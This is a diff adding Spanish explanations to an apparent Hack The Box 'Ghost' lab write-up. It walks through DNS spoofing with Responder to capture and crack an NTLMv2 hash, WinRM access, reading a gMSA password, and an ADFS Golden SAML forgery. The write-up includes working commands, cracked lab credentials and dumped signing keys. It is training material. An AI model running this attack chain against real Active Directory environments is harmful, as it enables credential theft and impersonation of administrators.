@@ -1006,9 +1006,13 @@ SMB         10.10.11.24     445    DC01             [+] ghost.htb\florence.ramir
 
 ### DNS Spoofing to Capture NTLMv2 Hash from User Attempting to Access Bitbucket
 
+Después de investigar en BloodHound para verificar las acciones posibles con el usuario `florence.ramirez`, no encontramos ninguna vulnerabilidad clara. Sin embargo, recordamos que en la Intranet, el usuario `justin.bradley` mencionaba que estaba teniendo problemas para acceder a `bitbucket.ghost.htb`.
+
+Esto nos llevó a pensar que podríamos revisar si esa entrada está registrada en el servidor DNS del Domain Controller. Si no lo está, una opción sería verificar si tenemos permisos para agregar una nueva entrada y redirigir el subdominio a nuestro servidor web, lo que nos permitiría realizar un ataque de **DNS Spoofing**.
+
 <figure><img src="../../.gitbook/assets/4590_vmware_FS9P8EQFLV.png" alt=""><figcaption></figcaption></figure>
 
-
+A través de la herramienta de `bloodyAD` realizaremos una consulta de los registros DNS del servidor.
 
 ```bash
 ❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k get dnsDump
@@ -1032,21 +1036,21 @@ SRV: dc01.ghost.htb:88
 ...[snip]...
 ```
 
-
+Dado que el resultado era bastante extenso, lo que realizamos es reenviar la salida del comando a un archvo llamado `dnsDump.txt`, para posteriormente filtrar por `bitbucket` en el archivo para comprobar si existía esta entrada. En este caso, verificamos que no hay la existencia de este subdominio en los registros del servidor DNS del DC.
 
 ```bash
 ❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k get dnsDump > dnsDump.txt
 ❯ grep 'bitbucket' dnsDump.txt
 ```
 
-
+Mediante la herramienta de `bloodyAD` lo que probamos es de intentar añadir un registro DNS llamado `bitbucket` para que apuntáse hacía nuestro servidor web. Comprobamos que se ha podido añadir correctamente el registro, alparecer disponíamos de los permisos necesarios con el usuario `florence.ramirez`.
 
 ```bash
 ❯ bloodyAD --host dc01.ghost.htb -d ghost.htb -k add dnsRecord bitbucket 10.10.16.7
 [+] bitbucket has been successfully added
 ```
 
-
+Utilizaremos el `responder` para levantar los servicios. Después de un tiempo, verificamos que nos llega el hash NTLMv2 del usuario `justin.bradley`, lo cual nos confirma del éxito del `DNS Spoofing`.
 
 ```bash
 ❯ sudo responder -I tun0
@@ -1058,9 +1062,7 @@ SRV: dc01.ghost.htb:88
 [HTTP] NTLMv2 Hash     : justin.bradley::ghost:379fd6cc8a217192:57521556E3919754EBD8F3CEF7C53692:010100000000000055A059C39A79DB0196D7986191DE13BA00000000020008005400460043004E0001001E00570049004E002D004D004D004C00550059003000520039004F004E003500040014005400460043004E002E004C004F00430041004C0003003400570049004E002D004D004D004C00550059003000520039004F004E0035002E005400460043004E002E004C004F00430041004C00050014005400460043004E002E004C004F00430041004C00080030003000000000000000000000000040000076536FB96280E0573AB44A1AC8269946A2295E50D4C33E8D9D4B3161337ACEAC0A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000
 ```
 
-
-
-
+Trataremos de crackear el hash obtenido y comprobamos que logramos crackear el hash y obtener las credenciales del usuario mencionado.
 
 ```bash
 ❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
@@ -1075,7 +1077,7 @@ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8,
 JUSTIN.BRADLEY::ghost:379fd6cc8a217192:57521556e3919754ebd8f3cef7c53692:010100000000000055a059c39a79db0196d7986191de13ba00000000020008005400460043004e0001001e00570049004e002d004d004d004c00550059003000520039004f004e003500040014005400460043004e002e004c004f00430041004c0003003400570049004e002d004d004d004c00550059003000520039004f004e0035002e005400460043004e002e004c004f00430041004c00050014005400460043004e002e004c004f00430041004c00080030003000000000000000000000000040000076536fb96280e0573ab44a1ac8269946a2295e50d4c33e8d9d4b3161337aceac0a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$
 ```
 
-
+Trataremos de validar a través de `nxc` de si las credenciales son válidas para el usuario, comprobamos que podemos autenticarnos con dichas credenciales y además tenemos permisos para acceder al DC mediante `WinRM` dado que tenemos de los permisos necesarios.
 
 ```bash
 ❯ nxc smb 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
@@ -1087,9 +1089,9 @@ WINRM       10.10.11.24     5985   DC01             [*] Windows Server 2022 Buil
 WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ (Pwn3d!)
 ```
 
-
-
 ### Abusing WinRM -EvilWinRM
+
+Nos conectaremos al Domain Controller a través de `evil-winrm` y logramos visualizar la flag de **user.txt**.
 
 ```bash
 ❯ evil-winrm -i 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
@@ -1102,38 +1104,32 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\justin.bradley\Documents> type ../Desktop/user.txt
-56ee926c00f4acca83b2f97a05afd868
+56ee926c00f*********************
 ```
-
-
 
 ## BloodHound Enumeration
 
-
-
-BLOODHOUND
-
-
+Revisaremos en `BloodHound` los Domain Admins existentes en el dominio, en este caso, solamente se muestra al usuario`Administrator`.
 
 <figure><img src="../../.gitbook/assets/imagen (35).png" alt=""><figcaption></figcaption></figure>
 
-
+Por otro lado, verificamos que el usuario `ADFS_GMSA$` es Kerberoastable. Tratamos de crackear su hash obtenido, pero no logramos crackear el hash para obtener la contraseña del usuario.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ## Shell as ADFS\_GMSA$
-
-
 
 ### Abusing ReadGMSAPassword (PowerView.py)
 
+Revisando nuevamente en `BloodHound`, comprobamos que el usuario actual `justin.bradley` dispone de privilegios de `ReadGMSAPassword` sobre el objeto `ADFS_GMSA$`.&#x20;
 
+{% hint style="info" %}
+Los privilegios de **ReadGMSAPassword** permiten a usuarios o grupos recuperar la contraseña de una **Group Managed Service Account (gMSA)** en un entorno de Active Directory. Estos privilegios se asignan para que ciertos servicios, servidores o aplicaciones puedan autenticarse automáticamente utilizando la cuenta sin necesidad de gestión manual de contraseñas. Sin embargo, si son otorgados a usuarios no autorizados, podrían permitir el acceso a servicios críticos o realizar ataques de escalación de privilegios.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Para recuperar la contraseña `GMSA` decidimos utillizar la herramienta de `PowerView.py`, al realizar la consulta de `Get-GMSA` logramos obtener el hash NTLM del objeto `ADFS_GMSA$`.
 
 ```bash
 ❯ powerview ghost.htb/'justin.bradley':'Qwertyuiop1234$$'@10.10.11.24 --dc-ip 10.10.11.24
@@ -1149,7 +1145,7 @@ PrincipallAllowedToRead     : GHOST\DC01$
 GMSAPassword                : 0bef79ae4d25b1864570212e33922d14
 ```
 
-
+Validaremos que el hash NTLM del usuario nos sirve para autenticarnos correctamente en el dominio.
 
 ```bash
 ❯ nxc smb 10.10.11.24 -u 'ADFS_GMSA$' -H '0bef79ae4d25b1864570212e33922d14'
@@ -1157,13 +1153,11 @@ SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Buil
 SMB         10.10.11.24     445    DC01             [+] ghost.htb\ADFS_GMSA$:0bef79ae4d25b1864570212e33922d14
 ```
 
-
-
-
+Verificamos que el usuario `ADFS_GMSA$` dispone del privilegio de `CanPSRemote` sobre el Domain Controller, con lo cual, podríamos conectarnos remotamente al DC.
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Nos conectaremos al `DC` mediante `evil-winrm`, verificamos el acceso correctamente.
 
 ```bash
 ❯ evil-winrm -i 10.10.11.24 -u 'ADFS_GMSA$' -H '0bef79ae4d25b1864570212e33922d14'
@@ -1178,15 +1172,35 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents> 
 ```
 
-
-
 ## Shell as mssqlserver
 
 ### Active Directory Federation Services (ADFS) - Golden SAML  Attack
 
+Por el nombre del equipo, pensamos que quizás esté relacionado con los `Active Directory Federation Services (ADFS)`.
+
+{% hint style="info" %}
+Los **Active Directory Federation Services (ADFS)** son una solución de Microsoft para proporcionar acceso único (SSO) a aplicaciones que no están dentro del dominio local de Active Directory. A través de ADFS, los usuarios pueden acceder a aplicaciones externas o servicios web sin necesidad de ingresar credenciales repetidamente. ADFS funciona emitiendo **tokens SAML** (Security Assertion Markup Language) que contienen información sobre la identidad del usuario y sus permisos.
+{% endhint %}
+
+Por lo cual, se nos ocurrió en intentar realizar un `Golden SAML Attack`.
+
+{% hint style="info" %}
+El **Golden SAML Attack** es una técnica utilizada para explotar las vulnerabilidades de autenticación en ADFS. En este ataque, el atacante roba el certificado utilizado para firmar los tokens SAML y lo usa para crear tokens de autenticación falsificados que le permiten acceder a aplicaciones federadas sin necesidad de que el usuario real esté presente. Es una forma muy efectiva de realizar escalada de privilegios o moverse lateralmente dentro de una red comprometida.
+{% endhint %}
+
+En este caso, con acceso a la cuenta **ADFS\_GMSA$**, que tiene privilegios sobre el Domain Controller (DC), un atacante puede potencialmente usar esta cuenta para generar un **Golden SAML Token**. Con dicho token, el atacante podría acceder a cualquier servicio federado que dependa de ADFS para autenticación, como si fuera un usuario legítimo.
+
 {% embed url="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adfs-federation-services/" %}
 
+Para realizar el **Golden SAML Attack**, debemos disponer del binario **ADFDump.exe**, una herramienta muy útil en este tipo de explotación. **ADFDump.exe** nos permite volcar los datos necesarios desde un **Active Directory Federation Services (ADFS)** y extraer el certificado privado que se utiliza para firmar los tokens SAML. Este certificado es crucial, ya que es la clave para crear **tokens SAML falsificados**.
 
+Una vez obtenemos este certificado, podemos generar un token SAML válido para cualquier usuario dentro del dominio, lo que nos permite **suplantar identidades** y acceder a servicios federados como si fuéramos usuarios legítimos. Lo mejor de este ataque es que, al no necesitar intervención directa de los usuarios afectados, es muy difícil de detectar.
+
+El proceso general sería:
+
+1. **Obtención del certificado**: Usamos **ADFDump.exe** para extraer el certificado privado de ADFS, el cual se encuentra en el servidor de ADFS.
+2. **Creación del Golden SAML Token**: Con el certificado, generamos el token SAML falso que contiene los datos de cualquier usuario, como si fuera un token legítimo.
+3. **Acceso a los servicios federados**: Utilizamos el token para acceder a aplicaciones federadas que confían en el sistema de ADFS para autenticación.
 
 ```bash
 ❯ ls -l LateralMovement
@@ -1217,7 +1231,7 @@ drwxrwxr-x kali kali 4.0 KB Fri Feb  7 21:49:08 2025  GPOAbuse
 .rw-rw-r-- kali kali  44 KB Fri Feb  7 21:49:08 2025  Whisker.exe
 ```
 
-
+Subiremos el `ADFSDump.exe` al DC y verificaremos que se encuentra correctamente en el equipo.
 
 ```powershell
 *Evil-WinRM* PS C:\ProgramData> upload ADFSDump.exe
@@ -1227,6 +1241,7 @@ Info: Uploading /home/kali/Desktop/HackTheBox/Windows/AD/Ghost/content/ADFSDump.
 Data: 305048 bytes of 305048 bytes copied
                                         
 Info: Upload successful!
+
 *Evil-WinRM* PS C:\ProgramData> ls
 
 
@@ -1247,10 +1262,24 @@ d-----         1/30/2024   9:21 AM                VMware
 -a----          2/7/2025  12:38 PM         228787 ADFSDump.exe
 ```
 
+Al ejecutar el binario de `ADFSDump.exe` en el DC podemos observar los siguientes resultados.
 
+* **Extracción de la clave privada desde el almacenamiento de Active Directory**:
+  * Dominio: _ghost.htb_
+  * Clave privada extraída:
+    * FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7
+    * 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
+* **Lectura de la clave de firma encriptada desde la base de datos**:\
+  La clave de firma encriptada fue extraída en base64 y tiene el siguiente formato:
 
-```powershell
-*Evil-WinRM* PS C:\ProgramData> .\ADFSDump.exe
+```bash
+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
+```
+
+* **Lectura de información de confianza de usuario autenticado desde la base de datos**\
+  Verificamos de la información correspondiente al SAML el cual el `EndPoint` se encuentra en [https://core.ghost.htb:8443/adfs/saml/postResponse](https://core.ghost.htb:8443/adfs/saml/postResponse)
+
+<pre class="language-powershell"><code class="lang-powershell">*Evil-WinRM* PS C:\ProgramData> .\ADFSDump.exe
 	   ___    ____  ___________ ____
    /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
   / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
@@ -1277,8 +1306,8 @@ AAAAAQAAAAAEEAFyHlNXh2VDska8KMTxXboGCWCGSAFlAwQCAQYJYIZIAWUDBAIBBglghkgBZQMEAQIE
 [-] Store location value: CurrentUser
 [-] Store name value: My
 
-## Reading The Issuer Identifier
-[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
+<strong>## Reading The Issuer Identifier
+</strong>[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
 [-] Detected AD FS 2019
 [-] Uncharted territory! This might not work...
 ## Reading Relying Party Trust Information from Database
@@ -1291,18 +1320,18 @@ core.ghost.htb
     Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
     SamlResponseSignatureType: 1;
     Identifier: https://core.ghost.htb:8443
-    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
-  <RequireFreshAuthentication>false</RequireFreshAuthentication>
-  <IssuanceAuthorizationRules>
-    <Rule>
-      <Conditions>
-        <Condition i:type="AlwaysCondition">
-          <Operator>IsPresent</Operator>
-        </Condition>
-      </Conditions>
-    </Rule>
-  </IssuanceAuthorizationRules>
-</PolicyMetadata>
+    Access Policy: &#x3C;PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
+  &#x3C;RequireFreshAuthentication>false&#x3C;/RequireFreshAuthentication>
+  &#x3C;IssuanceAuthorizationRules>
+    &#x3C;Rule>
+      &#x3C;Conditions>
+        &#x3C;Condition i:type="AlwaysCondition">
+          &#x3C;Operator>IsPresent&#x3C;/Operator>
+        &#x3C;/Condition>
+      &#x3C;/Conditions>
+    &#x3C;/Rule>
+  &#x3C;/IssuanceAuthorizationRules>
+&#x3C;/PolicyMetadata>
 
 
     Access Policy Parameter:
@@ -1311,17 +1340,27 @@ core.ghost.htb
 @RuleName = "LdapClaims"
 c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
  => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
-```
+</code></pre>
 
-
+Convertiremos el `PFX` y la `Private Key` en formato binario a través de los siguientes comandos.
 
 ```bash
-❯ catnp token | base64 -d > EncryptedPfx.bin
+❯ cat token | base64 -d > EncryptedPfx.bin
 
 ❯ echo '8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1' | tr -d '-' | xxd -r -p > dkmKey.bin
 ```
 
+Instalaremos la herramienta de `ADFSpoof` paa creación del `Golden SAML`.
 
+El comando ejecutado utiliza el script `ADFSpoof.py` para generar un ticket SAML manipulado, permitiendo la suplantación del usuario `administrator` en el dominio `GHOST`. Este ataque se realiza mediante la firma de un Golden Ticket.
+
+Se especifica un archivo PFX cifrado (`EncryptedPfx.bin`) que contiene la clave privada de la entidad de seguridad, junto con una clave secreta (`dkmKey.bin`). El objetivo es el servidor `core.ghost.htb`, sobre el cual se apunta el ataque SAML.
+
+El ticket generado contiene el formato `transient` para el `NameID`, indicando un identificador temporal para el usuario suplantado. Se definen las aserciones SAML que afirman que el usuario `GHOST\administrator` tiene privilegios de acceso, permitiendo el acceso al sistema como si fuera ese usuario.
+
+Este ataque, al manipular los datos SAML, da la capacidad de acceder a servicios protegidos sin necesidad de credenciales reales del usuario.
+
+{% embed url="https://github.com/mandiant/ADFSpoof" %}
 
 ```bash
 ❯ python3 ADFSpoof.py -b ../EncryptedPfx.bin ../dkmKey.bin -s core.ghost.htb saml2 --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'GHOST\administrator' --rpidentifier https://core.ghost.htb:8443 --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>GHOST\administrator</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>'
@@ -1340,30 +1379,34 @@ Created by @doughsec
 PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfUk9aMEVGIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0wMi0wN1QyMTowNDoxNy4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfNjBWN1M4IiBJc3N1ZUluc3RhbnQ9IjIwMjUtMDItMDdUMjE6MDQ6MTcuMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0i